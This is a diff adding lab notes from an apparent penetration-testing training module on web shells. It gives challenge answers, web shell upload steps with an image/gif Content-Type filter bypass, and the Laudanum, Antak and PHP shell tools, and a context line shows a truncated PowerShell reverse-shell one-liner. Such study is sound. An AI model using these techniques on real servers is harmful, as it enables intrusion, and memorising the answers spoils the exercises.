@@ -6,6 +6,11 @@
     2. [Bind Shells](#bind-shells)
     3. [Reverse Shells](#reverse-shells)
 2. [Windows Shell](#windows-shells)
+3. [Unix Shell](#unix-shells)
+4. [Web Shell](#web-shells)
+    1. [Laudanum, One Webshell to Rule Them All](#laudanum-one-webshell-to-rule-them-all)
+    2. [Antak Webshell](#antak-webshell)
+    3. [PHP Web Shells](#php-web-shells)
 
 ## Shell Basics
 ### Anatomy of a Shell
@@ -150,3 +155,41 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 2. Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.
 
     We can use module `rconfig_vendors_auth_file_upload_rce`. Then set the RHOSTS and LHOST. After that we can get the answer from there. The answer is `edgerouter-isp`.
+
+## Web Shells
+### Laudanum, One Webshell to Rule Them All
+#### Tools
+1. [Ladanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
+####  Challenges
+1.  Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\path\you\land\in)
+
+    We can solve this by using shell.aspx script from laudanmu. Dont forget to add our ip in there. After uploading the file, go to `http://status.inlanefreight.local//files/shell.aspx`. Then type `dir`. We can get our location then. The answer is `c:\windows\system32\inetsrv`.
+
+2. Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)
+
+    The answer is `/usr/share/laudanum/aspx/shell.aspx`.
+
+### Antak Webshell
+#### Tools
+1. [Nishang](https://github.com/samratashok/nishang)
+#### Challenges
+1. Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)
+
+    The answer is `/usr/share/nishang/Antak-WebShell/antak.aspx`.
+
+2. Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: ****\****, 1 space)
+
+    To solve this, after we uploaded `antak.aspx`, we can type `whoami`. The answer is `iis apppool\status`.
+
+### PHP Web Shells
+#### Tools
+1. [WhiteWinterWolf](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
+#### Challenges
+1. In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../... )
+
+    The answer is `image/gif`.
+
+2. Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)
+
+    We can solve this by using `webshell.php` from wwwolf. First we need to open our burpsuite. Then we intercept it when we add the vendor. In the burpsuit, change content type of file to image/gif. Then forward it. After successfuly uploaded, click image in the new tab of our uploaded file. Then we type `ls`. The answer is `ajax-loader.gif`. 
+
